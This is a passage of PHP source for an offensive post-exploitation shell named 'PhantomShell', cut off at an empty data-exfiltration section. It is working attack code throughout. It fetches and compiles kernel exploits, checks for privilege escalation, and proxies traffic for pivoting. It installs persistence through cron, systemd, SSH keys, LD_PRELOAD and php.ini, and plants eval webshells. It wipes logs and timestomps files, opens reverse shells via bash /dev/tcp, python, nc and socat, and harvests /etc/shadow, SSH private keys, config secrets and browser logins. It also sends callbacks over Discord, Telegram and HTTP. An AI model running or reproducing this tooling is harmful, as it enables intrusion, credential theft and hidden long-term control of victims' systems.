function cmd_exploit_suggest($s){sw($s,CYN."[Exploit Suggester]".R."\n");$kv=array(0,0,0);if(preg_match('/^(\d+)\.(\d+)\.(\d+)/',php_uname('r'),$m))$kv=array((int)$m[1],(int)$m[2],(int)$m[3]);$db=array(array('CVE-2016-5195','DirtyCow','exploit-db:40839',function($k){return($k[0]<4)||($k[0]==4&&$k[1]<8);}),array('CVE-2021-4034','PwnKit','exploit-db:50689',function($k){return true;}),array('CVE-2022-0847','DirtyPipe','exploit-db:50808',function($k){return($k[0]==5&&$k[1]>=8);}),array('CVE-2023-2640','GameOverlay','manual',function($k){return($k[0]==5&&$k[1]==15)||($k[0]==6&&$k[1]<=2);}),array('CVE-2024-1086','nf_tables','github',function($k){return($k[0]==5&&$k[1]>=14)||($k[0]==6&&$k[1]<=6);}));foreach($db as $e){$fn=$e[3];if($fn($kv)){if($e[0]==='CVE-2021-4034'){$chk='';x('which pkexec 2>/dev/null',$chk);if(!trim($chk))continue;}sw($s,"  ".RED."[!] {$e[0]} — {$e[1]}".R." Ref: {$e[2]}\n");}}sw($s,"\n");}
function cmd_exploit_fetch($s,$cve){if(!$cve){sw($s,RED."Usage: exploit_fetch <CVE>".R."\n");return;}$urls=array('CVE-2016-5195'=>'https://www.exploit-db.com/download/40839','CVE-2021-4034'=>'https://www.exploit-db.com/download/50689','CVE-2022-0847'=>'https://www.exploit-db.com/download/50808');$cve=strtoupper(trim($cve));if(!isset($urls[$cve])){sw($s,RED."[-] No URL for $cve".R."\n");return;}$fn="/tmp/".strtolower(str_replace('-','_',$cve)).".c";$o='';x("wget -q -O $fn '{$urls[$cve]}' 2>&1||curl -sL -o $fn '{$urls[$cve]}' 2>&1",$o);sw($s,(file_exists($fn)&&filesize($fn)>100)?GRN."[+] $fn".R."\n":RED."[-] Failed".R."\n");}
function cmd_exploit_compile($s,$cve){if(!$cve){sw($s,RED."Usage: exploit_compile <CVE>".R."\n");return;}$cve=strtoupper(trim($cve));$src="/tmp/".strtolower(str_replace('-','_',$cve)).".c";$bin="/tmp/".strtolower(str_replace('-','_',$cve));if(!file_exists($src)){sw($s,RED."[-] Not found: $src".R."\n");return;}$o='';x("gcc -o $bin $src -lpthread -static 2>&1||gcc -o $bin $src 2>&1",$o);if(file_exists($bin)&&filesize($bin)>1000){@chmod($bin,0755);sw($s,GRN."[+] $bin".R."\n");}else sw($s,RED."[-]".R."\n$o\n");}

// =============================================
// 15. PRIVESC
// =============================================
function cmd_privesc_check($s){sw($s,CYN."[Privesc Check]".R."\n");foreach(array('SUID'=>'find / -perm -4000 -type f 2>/dev/null','SGID'=>'find / -perm -2000 -type f 2>/dev/null|head -15','Sudo'=>'sudo -n -l 2>&1','Cron'=>'crontab -l 2>/dev/null;cat /etc/crontab 2>/dev/null','Caps'=>'getcap -r / 2>/dev/null','PATH'=>'echo $PATH|tr ":" "\n"|xargs -I{} find {} -writable -type d 2>/dev/null','Docker'=>'id -nG|grep -oE "(docker|lxd)"','NFS'=>'cat /etc/exports 2>/dev/null','Internal'=>'ss -tlnp 2>/dev/null|grep 127.0.0.1') as $l=>$c){$o='';x($c,$o);$o=trim($o);if($o)sw($s,"\n".YEL."[$l]".R."\n$o\n");}sw($s,"\n");}
function cmd_privesc_auto($s){sw($s,RED."[AUTO PRIVESC]".R."\n");$kv=array(0,0,0);if(preg_match('/^(\d+)\.(\d+)\.(\d+)/',php_uname('r'),$m))$kv=array((int)$m[1],(int)$m[2],(int)$m[3]);sw($s,YEL."[1]".R." PwnKit...\n");$o='';x('which pkexec 2>/dev/null',$o);if(trim($o))sw($s,"  pkexec found. Use exploit_fetch/compile\n");sw($s,YEL."[2]".R." GameOverlay...\n");if(($kv[0]==5&&$kv[1]==15)||($kv[0]==6&&$kv[1]<=2))sw($s,"  ".RED."Vulnerable".R.". Run manually.\n");sw($s,YEL."[3]".R." DirtyPipe...\n");if($kv[0]==5&&$kv[1]>=8)sw($s,"  ".RED."Possible".R.". exploit_fetch CVE-2022-0847\n");sw($s,"\n");}
function cmd_privesc_suggest($s){sw($s,CYN."[Steps]".R."\n");foreach(array("1. sudo -l","2. SUID → GTFOBins","3. Cron writable scripts?","4. Capabilities","5. PATH hijack","6. LD_PRELOAD","7. Kernel exploit","8. Docker escape","9. NFS no_root_squash","10. /etc/passwd writable") as $st)sw($s,"  $st\n");sw($s,"\n");}

// =============================================
// 16. PIVOTING
// =============================================
function cmd_pivot_list($s){sw($s,CYN."[Pivoting]".R."\n");foreach(array('pivot_portfwd <lp> <rh> <rp>'=>'TCP fwd','pivot_socks'=>'SOCKS4','pivot_tunnel <rh> <rp> <lp>'=>'Tunnel','pivot_ligolo'=>'Ligolo-ng','pivot_chisel'=>'Chisel','pivot_ssh'=>'SSH','pivot_rpivot'=>'rpivot','pivot_earthworm'=>'EW','pivot_proxychain'=>'proxychains') as $c=>$d)sw($s,"  ".YEL.$c.R." $d\n");sw($s,"\n");}
function cmd_pivot_portfwd($sock,$a){$p=preg_split('/\s+/',trim($a));if(count($p)<3){sw($sock,RED."Usage: pivot_portfwd <lp> <rh> <rp>".R."\n");return;}$lp=(int)$p[0];$rh=$p[1];$rp=(int)$p[2];$srv=@stream_socket_server("tcp://0.0.0.0:$lp",$en,$es);if(!$srv){sw($sock,RED."[-] $es".R."\n");return;}sw($sock,GRN."[+]".R." :$lp->$rh:$rp Ctrl+C\n");stream_set_blocking($srv,false);$cls=array();while(true){$cl=@stream_socket_accept($srv,0);if($cl){$rm=@fsockopen($rh,$rp,$en,$es,5);if($rm){stream_set_blocking($cl,false);stream_set_blocking($rm,false);$cls[]=array($cl,$rm);}else @fclose($cl);}foreach($cls as $k=>$pr){$d1=@fread($pr[0],4096);if($d1!==false&&$d1!=='')@fwrite($pr[1],$d1);$d2=@fread($pr[1],4096);if($d2!==false&&$d2!=='')@fwrite($pr[0],$d2);if(feof($pr[0])||feof($pr[1])){@fclose($pr[0]);@fclose($pr[1]);unset($cls[$k]);}}$cls=array_values($cls);$rs=array($sock);$w=null;$e=null;if(@stream_select($rs,$w,$e,0,50000)>0){$in=fread($sock,64);if($in!==false&&strpos($in,"\x03")!==false){foreach($cls as $pr){@fclose($pr[0]);@fclose($pr[1]);}@fclose($srv);sw($sock,"\nStopped\n");return;}}usleep(10000);}}
function cmd_pivot_socks($sock){$port=1080;$srv=@stream_socket_server("tcp://0.0.0.0:$port",$en,$es);if(!$srv){sw($sock,RED."[-] $es".R."\n");return;}sw($sock,GRN."[+]".R." SOCKS4 :$port Ctrl+C\n");stream_set_blocking($srv,false);$co=array();while(true){$cl=@stream_socket_accept($srv,0);if($cl){stream_set_blocking($cl,true);stream_set_timeout($cl,5);$hd=@fread($cl,9);if(strlen($hd)>=8&&ord($hd[0])===4&&ord($hd[1])===1){$dp=(ord($hd[2])<<8)+ord($hd[3]);$di=ord($hd[4]).'.'.ord($hd[5]).'.'.ord($hd[6]).'.'.ord($hd[7]);while(($b=@fread($cl,1))!==false&&$b!=="\x00"&&$b!==''){}$rm=@fsockopen($di,$dp,$en,$es,5);if($rm){@fwrite($cl,"\x00\x5a".substr($hd,2,6));stream_set_blocking($cl,false);stream_set_blocking($rm,false);$co[]=array($cl,$rm);sw($sock,GRN."[+]".R." ->$di:$dp\n");}else{@fwrite($cl,"\x00\x5b".substr($hd,2,6));@fclose($cl);}}else @fclose($cl);}foreach($co as $k=>$pr){$d1=@fread($pr[0],8192);if($d1!==false&&$d1!=='')@fwrite($pr[1],$d1);$d2=@fread($pr[1],8192);if($d2!==false&&$d2!=='')@fwrite($pr[0],$d2);if(feof($pr[0])||feof($pr[1])){@fclose($pr[0]);@fclose($pr[1]);unset($co[$k]);}}$co=array_values($co);$rs=array($sock);$w=null;$e=null;if(@stream_select($rs,$w,$e,0,50000)>0){$in=fread($sock,64);if($in!==false&&strpos($in,"\x03")!==false){foreach($co as $pr){@fclose($pr[0]);@fclose($pr[1]);}@fclose($srv);sw($sock,"\nStopped\n");return;}}usleep(10000);}}
function cmd_pivot_tunnel($sock,$a){$p=preg_split('/\s+/',trim($a));if(count($p)<3){sw($sock,RED."Usage: pivot_tunnel <rh> <rp> <lp>".R."\n");return;}cmd_pivot_portfwd($sock,"{$p[2]} {$p[0]} {$p[1]}");}
function cmd_pivot_ligolo($s){sw($s,CYN."[Ligolo-ng]".R."\n  Server: ligolo-proxy -selfcert -laddr 0.0.0.0:11601\n  Agent: ./agent -connect <IP>:11601 -ignore-cert\n\n");}
function cmd_pivot_chisel($s){sw($s,CYN."[Chisel]".R."\n  Server: chisel server -p 8000 --reverse\n  SOCKS: chisel client <IP>:8000 R:socks\n  Fwd: chisel client <IP>:8000 R:8080:127.0.0.1:80\n\n");}
function cmd_pivot_ssh($s){sw($s,CYN."[SSH]".R."\n  Dynamic: ssh -D 1080 -N user@pivot\n  Local: ssh -L 8080:target:80 user@pivot\n  Remote: ssh -R 9090:localhost:22 user@attacker\n\n");}
function cmd_pivot_rpivot($s){sw($s,CYN."[rpivot]".R."\n  Server: python server.py --server-port 9999\n  Client: python client.py --server-ip <IP> --server-port 9999\n\n");}
function cmd_pivot_earthworm($s){sw($s,CYN."[EW]".R."\n  SOCKS: ./ew -s ssocksd -l 1080\n  Reverse: ./ew -s rssocks -d <IP> -e 1080\n\n");}
function cmd_pivot_proxychain($s){$p='/tmp/.proxychains.conf';@file_put_contents($p,"strict_chain\nproxy_dns\n[ProxyList]\nsocks4 127.0.0.1 1080\n");sw($s,GRN."[+]".R." $p\n  proxychains -f $p <cmd>\n\n");}

// =============================================
// 17. NETWORK TOOLS
// =============================================
function cmd_portscan($sock,$a){$p=preg_split('/\s+/',trim($a));if(count($p)<2){sw($sock,RED."Usage: portscan <host> <ports> [timeout]".R."\n");return;}$host=$p[0];$to=isset($p[2])?(float)$p[2]:1.0;$ports=array();foreach(explode(',',$p[1]) as $sp){if(strpos($sp,'-')!==false){$r=explode('-',$sp);for($i=max(1,(int)$r[0]);$i<=min(65535,(int)$r[1]);$i++)$ports[]=$i;}else $ports[]=(int)$sp;}$svc=array(21=>'FTP',22=>'SSH',25=>'SMTP',53=>'DNS',80=>'HTTP',110=>'POP3',135=>'MSRPC',143=>'IMAP',443=>'HTTPS',445=>'SMB',3306=>'MySQL',3389=>'RDP',5432=>'PgSQL',5900=>'VNC',6379=>'Redis',8080=>'HTTP-Alt',27017=>'MongoDB');$open=array();foreach($ports as $pt){$fp=@fsockopen($host,$pt,$en,$es,$to);if($fp){$bn=trim(@fread($fp,256));@fclose($fp);$sv=isset($svc[$pt])?" ({$svc[$pt]})":'';sw($sock,"  ".GRN."OPEN".R." :$pt$sv".($bn?" — ".substr($bn,0,60):'')."\n");$open[]=$pt;}}sw($sock,YEL."[*]".R." ".count($open)."/".count($ports)." open\n");}
function cmd_connect($sock,$a){$p=preg_split('/\s+/',trim($a));if(count($p)<2){sw($sock,RED."Usage: connect <h> <p>".R."\n");return;}$rm=@fsockopen($p[0],(int)$p[1],$en,$es,10);if(!$rm){sw($sock,RED."[-]".R."\n");return;}stream_set_blocking($rm,false);sw($sock,GRN."[+]".R." ~. exit\n");$db='';while(true){$d=@fread($rm,4096);if($d!==false&&$d!=='')sw($sock,$d);$r=array($sock);$w=null;$e=null;if(@stream_select($r,$w,$e,0,100000)>0){$in=fread($sock,4096);if($in===false||$in==='')break;$db.=$in;if(strpos($db,"~.")!==false)break;if(strlen($db)>10)$db=substr($db,-2);@fwrite($rm,$in);}if(feof($rm))break;usleep(10000);}@fclose($rm);}
function cmd_listen($sock,$a){$port=(int)trim($a);if($port<1){sw($sock,RED."Usage: listen <port>".R."\n");return;}$srv=@stream_socket_server("tcp://0.0.0.0:$port",$en,$es);if(!$srv){sw($sock,RED."[-]".R."\n");return;}sw($sock,GRN."[+]".R." :$port Ctrl+C\n");stream_set_blocking($srv,false);$cl=null;while(!$cl){$cl=@stream_socket_accept($srv,0);$r=array($sock);$w=null;$e=null;if(@stream_select($r,$w,$e,0,200000)>0){$in=fread($sock,64);if($in===false||strpos($in,"\x03")!==false){@fclose($srv);sw($sock,"\n");return;}}usleep(100000);}sw($sock,GRN."[+]".R." ".stream_socket_get_name($cl,true)." ~. close\n");stream_set_blocking($cl,false);while(true){$d=@fread($cl,4096);if($d!==false&&$d!=='')sw($sock,$d);$r=array($sock);$w=null;$e=null;if(@stream_select($r,$w,$e,0,100000)>0){$in=fread($sock,4096);if($in===false||strpos($in,"\x03")!==false)break;@fwrite($cl,$in);}if(feof($cl))break;usleep(10000);}@fclose($cl);@fclose($srv);}
function cmd_bannergrab($sock,$a){$p=preg_split('/\s+/',trim($a));if(count($p)<2){sw($sock,RED."Usage: bannergrab <h> <p>".R."\n");return;}$fp=@fsockopen($p[0],(int)$p[1],$en,$es,5);if(!$fp){sw($sock,RED."[-]".R."\n");return;}stream_set_timeout($fp,5);$probes=array(80=>"HEAD / HTTP/1.0\r\nHost: {$p[0]}\r\n\r\n",25=>"EHLO test\r\n");if(isset($probes[(int)$p[1]]))@fwrite($fp,$probes[(int)$p[1]]);usleep(500000);$b='';while(!feof($fp)){$d=@fread($fp,4096);if(!$d)break;$b.=$d;if(strlen($b)>4096)break;}@fclose($fp);sw($sock,$b?GRN."[+]".R."\n$b\n":RED."[-]".R."\n");}

// =============================================
// 18. PERSISTENCE
// =============================================
function _pcopy(){$d='/tmp/.cache_'.substr(md5(__FILE__),0,6).'.php';@file_put_contents($d,@file_get_contents(__FILE__));@chmod($d,0644);return $d;}
function cmd_persist_all($s){sw($s,RED."[!] ALL persistence".R."\n");cmd_persist_cron($s);cmd_persist_ssh($s);cmd_persist_systemd($s);cmd_persist_rc($s);cmd_persist_motd($s);cmd_persist_php($s);cmd_persist_web($s);sw($s,GRN."Done".R."\n");}
function cmd_persist_cron($s){$pl=_pcopy();$cl="* * * * * php $pl >/dev/null 2>&1";$cur='';x('crontab -l 2>/dev/null',$cur);if(strpos($cur,$pl)!==false)return;$tmp=tempnam('/tmp','cr');file_put_contents($tmp,trim($cur)."\n$cl\n");x("crontab $tmp",$o);@unlink($tmp);sw($s,GRN."[+]".R." Cron\n");@file_put_contents('/etc/cron.d/.cache_upd',"* * * * * root php $pl >/dev/null 2>&1\n");}
function cmd_persist_ssh($sock){sw($sock,YEL."Paste SSH key:".R."\n");stream_set_blocking($sock,true);stream_set_timeout($sock,120);$key=trim(@fgets($sock,8192));stream_set_blocking($sock,false);if(!$key||$key==='cancel')return;$home=getenv('HOME')?:'/tmp';$sd="$home/.ssh";if(!is_dir($sd))@mkdir($sd,0700,true);$af="$sd/authorized_keys";$ex=(string)@file_get_contents($af);if(strpos($ex,$key)!==false)return;@file_put_contents($af,$ex.$key."\n",FILE_APPEND);@chmod($af,0600);sw($sock,GRN."[+]".R." $af\n");}
function cmd_persist_systemd($s){$pl=_pcopy();$body="[Unit]\nDescription=Cache\nAfter=network.target\n[Service]\nExecStart=/usr/bin/php $pl\nRestart=always\nRestartSec=10\n[Install]\nWantedBy=multi-user.target\n";$p="/etc/systemd/system/cache-update.service";if(@file_put_contents($p,$body)!==false){x("systemctl daemon-reload&&systemctl enable cache-update&&systemctl start cache-update 2>&1",$o);sw($s,GRN."[+]".R." $p\n");return;}$ud=(getenv('HOME')?:'/root').'/.config/systemd/user';@mkdir($ud,0755,true);@file_put_contents("$ud/cache-update.service",$body);x("systemctl --user daemon-reload 2>&1",$o);sw($s,GRN."[+]".R." User svc\n");}
function cmd_persist_rc($s){$pl=_pcopy();$ln="php $pl >/dev/null 2>&1 &";$home=getenv('HOME')?:'/root';foreach(array("$home/.bashrc","$home/.profile","$home/.zshrc") as $rc){if(!file_exists($rc))continue;$c=@file_get_contents($rc);if($c===false||strpos($c,$ln)!==false)continue;@file_put_contents($rc,$c."\n$ln\n");sw($s,GRN."[+]".R." $rc\n");}}
function cmd_persist_motd($s){$pl=_pcopy();$p='/etc/update-motd.d/99-cache';if(@file_put_contents($p,"#!/bin/bash\nphp $pl >/dev/null 2>&1 &\n")!==false){@chmod($p,0755);sw($s,GRN."[+]".R." $p\n");}else sw($s,RED."[-]".R."\n");}
function cmd_persist_ldpreload($s){$cc='#include <stdlib.h>\n#include <unistd.h>\n__attribute__((constructor)) void init(){if(fork()==0){setsid();system("php /tmp/.cache_update.php &");_exit(0);}}\n';@file_put_contents('/tmp/.lc.c',$cc);$o='';x('gcc -shared -fPIC -o /tmp/.lc.so /tmp/.lc.c -nostartfiles 2>&1',$o);if(file_exists('/tmp/.lc.so')){@file_put_contents('/etc/ld.so.preload',"/tmp/.lc.so\n");sw($s,GRN."[+]".R." LD_PRELOAD\n");}else sw($s,RED."[-]".R."\n");@unlink('/tmp/.lc.c');}
function cmd_persist_php($s){$pl=_pcopy();foreach(array('/etc/php/8.2/cli/php.ini','/etc/php/8.1/cli/php.ini','/etc/php/7.4/cli/php.ini','/etc/php.ini') as $ini){if(!file_exists($ini)||!is_writable($ini))continue;$c=@file_get_contents($ini);if(strpos($c,$pl)!==false)continue;@file_put_contents($ini,$c."\nauto_prepend_file=$pl\n");sw($s,GRN."[+]".R." $ini\n");}foreach(array('/var/www/html','/var/www') as $wr){if(!is_dir($wr))continue;@file_put_contents("$wr/.user.ini","auto_prepend_file=$pl\n");sw($s,GRN."[+]".R." $wr/.user.ini\n");}}
function cmd_persist_web($s){$sh='<?php @eval($_REQUEST["c"]);?>';foreach(array('/var/www/html','/var/www','/srv/www') as $d){if(!is_dir($d)||!is_writable($d))continue;foreach(array('.info.php','.health.php') as $n)if(@file_put_contents("$d/$n",$sh)!==false){sw($s,GRN."[+]".R." $d/$n\n");return;}}sw($s,RED."[-]".R."\n");}
function cmd_persist_wsl($s){$o='';x('wsl.exe --list 2>/dev/null',$o);sw($s,trim($o)?YEL."WSL found. cp to /mnt/c/".R."\n":RED."No WSL".R."\n");}

// =============================================
// 19. ANTI-FORENSICS
// =============================================
function cmd_clean_logs($s){sw($s,RED."[!] Cleaning".R."\n");foreach(array('/var/log/auth.log','/var/log/syslog','/var/log/messages','/var/log/secure','/var/log/apache2/access.log','/var/log/apache2/error.log','/var/log/nginx/access.log','/var/log/nginx/error.log','/var/log/wtmp','/var/log/btmp') as $l)if(file_exists($l)&&is_writable($l)){@file_put_contents($l,'');sw($s,"  ".GRN.$l.R."\n");}x('history -c;>~/.bash_history 2>/dev/null',$o);sw($s,GRN."[+] Done".R."\n");}
function cmd_clean_self($s){global $CFG;x("shred -vfz -n 3 ".escapeshellarg(__FILE__)." 2>&1",$o);if(file_exists(__FILE__))@unlink(__FILE__);@unlink('/tmp/.cache_update.php');@unlink($CFG['hist_file']);sw($s,GRN."[+] Cleaned".R."\n");@fclose($s);exit(0);}
function cmd_hide_process($s){$t=array('[kworker/0:2]','[migration/0]','[kthreadd]','[rcu_preempt]');$tt=$t[crc32(__FILE__)%count($t)];if(function_exists('cli_set_process_title'))@cli_set_process_title($tt);sw($s,GRN."[+]".R." $tt PID:".getmypid()."\n");}
function cmd_hide_connection($s){$cc='#define _GNU_SOURCE\n#include <stdio.h>\n#include <dlfcn.h>\ntypedef FILE*(*ft)(const char*,const char*);\nFILE*fopen(const char*p,const char*m){ft o=(ft)dlsym(RTLD_NEXT,"fopen");return o(p,m);}\n';@file_put_contents('/tmp/.lh.c',$cc);$o='';x('gcc -shared -fPIC -o /tmp/.lh.so /tmp/.lh.c -ldl 2>&1',$o);sw($s,file_exists('/tmp/.lh.so')?GRN."[+] /tmp/.lh.so".R."\n":RED."[-]".R."\n");@unlink('/tmp/.lh.c');}
function cmd_timestomp($s,$a){$p=preg_split('/\s+/',trim($a),2);if(!isset($p[0])||!$p[0]){sw($s,RED."Usage: timestomp <f> [ref]".R."\n");return;}if(isset($p[1])&&file_exists($p[1]))x("touch -r ".escapeshellarg($p[1])." ".escapeshellarg($p[0]),$o);else x("touch -t 202001010000 ".escapeshellarg($p[0]),$o);sw($s,GRN."[+]".R."\n");}
function cmd_alter_conn($sock,$a){$p=preg_split('/\s+/',trim($a));if(count($p)<2){sw($sock,RED."Usage: alter_conn <ip> <port>".R."\n");return;}$h=$p[0];$pt=$p[1];foreach(array("bash -c 'bash -i >& /dev/tcp/$h/$pt 0>&1' &","python3 -c 'import os,pty,socket as s;c=s.socket();c.connect((\"$h\",$pt));[os.dup2(c.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")' &","php -r '\$s=fsockopen(\"$h\",$pt);\$p=proc_open(\"/bin/bash\",array(0=>\$s,1=>\$s,2=>\$s),\$x);' &") as $m){$o='';$e='';x($m,$o,$e);if(strpos($e,'not found')===false){sw($sock,GRN."[+]".R." ->$h:$pt\n");return;}}sw($sock,RED."[-]".R."\n");}
function cmd_memory_only($s){sw($s,CYN."[Memory-Only]".R."\n");$src=@file_get_contents(__FILE__);if($src){$b64=base64_encode($src);sw($s,YEL."[*]".R." Execute without file:\n  php -r 'eval(base64_decode(\"".substr($b64,0,60)."...\"));'\n");sw($s,YEL."[*]".R." Full b64 length: ".strlen($b64)." bytes\n");$tmp=tempnam('/tmp','m_');@file_put_contents($tmp,"php -r 'eval(base64_decode(\"$b64\"));'\n");sw($s,GRN."[+]".R." Saved one-liner: $tmp\n");}sw($s,"\n");}

// =============================================
// 20. LATERAL MOVEMENT
// =============================================
function cmd_lateral_ssh($s,$a){if(!trim($a)){sw($s,RED."Usage: lateral_ssh <user>@<host> [pass]".R."\n");return;}$p=preg_split('/\s+/',trim($a),2);$t=$p[0];$pw=isset($p[1])?$p[1]:'';$cmd=$pw?'sshpass -p '.escapeshellarg($pw).' ssh -o StrictHostKeyChecking=no '.$t.' id 2>&1':'ssh -o StrictHostKeyChecking=no -o BatchMode=yes '.$t.' id 2>&1';$o='';x($cmd,$o);sw($s,(strpos($o,'uid=')!==false?GRN."[+]":RED."[-]").R." $o\n");}
function cmd_lateral_scp($s,$a){if(!trim($a)){sw($s,RED."Usage: lateral_scp <src> <user>@<host>:<dest>".R."\n");return;}xs("scp -o StrictHostKeyChecking=no $a 2>&1",$s);}
function cmd_lateral_wmi($s,$a){if(!trim($a)){sw($s,RED."Usage: lateral_wmi <user>@<host> <cmd>".R."\n");return;}$o='';x('which wmiexec.py 2>/dev/null||which impacket-wmiexec 2>/dev/null',$o);if(trim($o))xs(trim($o)." $a 2>&1",$s);else sw($s,RED."[-] No WMI tools".R."\n");}
function cmd_lateral_smb($s,$a){$p=preg_split('/\s+/',trim($a));if(!isset($p[0])||!$p[0]){sw($s,RED."Usage: lateral_smb <host> [share]".R."\n");return;}$o='';x('which smbclient 2>/dev/null',$o);if(!trim($o)){sw($s,RED."[-]".R."\n");return;}isset($p[1])?xs("smbclient //{$p[0]}/{$p[1]} -N 2>&1",$s):xs("smbclient -L //{$p[0]} -N 2>&1",$s);}

// =============================================
// 21. CREDENTIAL HARVESTING
// =============================================
function cmd_steal_all($s){sw($s,CYN."[STEAL ALL]".R."\n");cmd_steal_configs($s);cmd_steal_ssh($s);cmd_steal_history($s);cmd_steal_passwords($s);cmd_steal_etc($s);cmd_steal_browsers($s);sw($s,GRN."[+] Complete".R."\n");}
function cmd_steal_configs($s){sw($s,YEL."[Configs]".R."\n");$o='';x('find / -maxdepth 5 \( -name ".env" -o -name "wp-config.php" -o -name "config.php" -o -name "settings.inc.php" -o -name "database.yml" \) -readable -type f 2>/dev/null',$o);foreach(array_filter(explode("\n",trim($o))) as $f){sw($s,"  ".YEL.$f.R."\n");$c=@file_get_contents($f);if(!$c)continue;foreach(explode("\n",$c) as $l)if(preg_match('/(pass|secret|key|token|db_|database)/i',$l))sw($s,"    ".RED.$l.R."\n");}sw($s,"\n");}
function cmd_steal_ssh($s){sw($s,YEL."[SSH Keys]".R."\n");$o='';x('find /home /root -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null',$o);foreach(array_filter(explode("\n",trim($o))) as $k){sw($s,RED."[!]".R." $k\n");$c=@file_get_contents($k);if($c)sw($s,DIM.$c.R."\n");}sw($s,"\n");}
function cmd_steal_history($s){$o='';x('find /home /root -maxdepth 2 \( -name ".bash_history" -o -name ".zsh_history" -o -name ".mysql_history" \) -readable 2>/dev/null',$o);foreach(array_filter(explode("\n",trim($o))) as $f){sw($s,YEL."[$f]".R."\n");$c=@file_get_contents($f);if(!$c)continue;foreach(explode("\n",$c) as $l)if(preg_match('/(password|passwd|ssh|curl.*-u|mysql.*-p)/i',$l))sw($s,"  ".RED.$l.R."\n");}sw($s,"\n");}
function cmd_steal_passwords($s){foreach(array('/var/www','/opt','/srv','/home') as $d){if(!is_dir($d))continue;$o='';x("grep -rlE '(password|passwd)\\s*[:=]' $d 2>/dev/null|head -15",$o);foreach(array_filter(explode("\n",trim($o))) as $f){$fo='';x("grep -inE '(password|passwd)\\s*[:=]' ".escapeshellarg($f)." 2>/dev/null|head -3",$fo);if(trim($fo))sw($s,"  ".RED.$f.R.":\n    ".str_replace("\n","\n    ",trim($fo))."\n");}}sw($s,"\n");}
function cmd_steal_etc($s){sw($s,YEL."[/etc/passwd]".R."\n");$c=@file_get_contents('/etc/passwd');if($c)foreach(explode("\n",$c) as $l){if(preg_match('/:0:/',$l)||preg_match('/sh$/',$l))sw($s,"  ".RED.$l.R."\n");}sw($s,YEL."[/etc/shadow]".R."\n");$c=@file_get_contents('/etc/shadow');if($c)foreach(explode("\n",$c) as $l){if($l&&!preg_match('/:\*:|:!:/',$l))sw($s,"  ".RED.$l.R."\n");}else sw($s,DIM."  Not readable".R."\n");sw($s,"\n");}
function cmd_steal_browsers($s){$o='';x('find /home /root -maxdepth 5 \( -name "logins.json" -o -name "Login Data" -o -name "cookies.sqlite" -o -name "Cookies" \) -type f 2>/dev/null',$o);sw($s,trim($o)?RED."[!]".R."\n$o\n  download to exfil\n":DIM."None".R."\n");}

// =============================================
// 22. BACKDOORS & C2
// =============================================
function cmd_backdoor_php($s,$a){$p=$a?:'/var/www/html/.cache.php';sw($s,@file_put_contents($p,'<?php @eval($_REQUEST["c"]);?>')!==false?GRN."[+] $p".R."\n":RED."[-]".R."\n");}
function cmd_backdoor_python($s){global $CFG;sw($s,YEL."python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{$CFG['host']}\",{$CFG['port']}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'".R."\n");}
function cmd_backdoor_bash($s){global $CFG;sw($s,YEL."bash -c 'bash -i >& /dev/tcp/{$CFG['host']}/{$CFG['port']} 0>&1'".R."\n");}
function cmd_backdoor_nc($s){global $CFG;sw($s,YEL."rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {$CFG['host']} {$CFG['port']} >/tmp/f".R."\n");}
function cmd_backdoor_socat($s){global $CFG;sw($s,YEL."socat TCP4:{$CFG['host']}:{$CFG['port']} EXEC:/bin/bash,pty,stderr,setsid".R."\n");}
function cmd_backdoor_web($s){$sh='<?php system($_GET["cmd"]);?>';$ok=0;foreach(array('/var/www/html','/var/www','/srv/www','/usr/share/nginx/html') as $d){if(!is_dir($d)||!is_writable($d))continue;foreach(array('.cmd.php','._info.php','wp-cache.php') as $n)if(@file_put_contents("$d/$n",$sh)!==false){sw($s,GRN."[+]".R." $d/$n\n");$ok++;break;}}if(!$ok)sw($s,RED."[-]".R."\n");}
function cmd_webshell($s){cmd_backdoor_web($s);}
function cmd_c2_sliver($s){sw($s,CYN."[Sliver]".R."\n  generate --mtls <IP> --os linux\n  Upload+execute\n\n");}
function cmd_c2_cobalt($s){sw($s,CYN."[Cobalt Strike]".R."\n  CrossC2 for Linux beacons\n\n");}
function cmd_c2_meterpreter($s){global $CFG;sw($s,CYN."[Meterpreter]".R."\n  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={$CFG['host']} LPORT={$CFG['port']} -f elf -o shell.elf\n\n");}
function cmd_c2_venom($s){sw($s,CYN."[Venom]".R." github.com/r00t-3xp10it/venom\n\n");}
function cmd_c2_discord($s,$a){if(!trim($a)){sw($s,RED."Usage: c2_discord <webhook_url>".R."\n");return;}$url=trim($a);$data=array('content'=>'[PhantomShell] '.g_user().'@'.g_host().' '.getcwd(),'username'=>'Phantom');$json=json_encode($data);$o='';x("curl -s -H 'Content-Type: application/json' -d ".escapeshellarg($json)." ".escapeshellarg($url)." 2>&1",$o);sw($s,GRN."[+]".R." Sent\n");}
function cmd_c2_telegram($s,$a){$p=preg_split('/\s+/',trim($a),2);if(count($p)<2){sw($s,RED."Usage: c2_telegram <token> <chat_id>".R."\n");return;}$tok=$p[0];$cid=$p[1];$msg=urlencode('[PhantomShell] '.g_user().'@'.g_host().' '.getcwd());$o='';x("curl -s 'https://api.telegram.org/bot$tok/sendMessage?chat_id=$cid&text=$msg' 2>&1",$o);sw($s,GRN."[+]".R." Sent\n");}
function cmd_c2_http($s,$a){if(!trim($a)){sw($s,RED."Usage: c2_http <url>".R."\n");return;}$data=json_encode(array('user'=>g_user(),'host'=>g_host(),'cwd'=>getcwd(),'uid'=>g_uid(),'os'=>g_os(),'kernel'=>php_uname('r')));$o='';x("curl -s -X POST -H 'Content-Type: application/json' -d ".escapeshellarg($data)." ".escapeshellarg(trim($a))." 2>&1",$o);sw($s,GRN."[+]".R." Callback sent\n");}

// =============================================
// 23. DATA EXFILTRATION
// =============================================
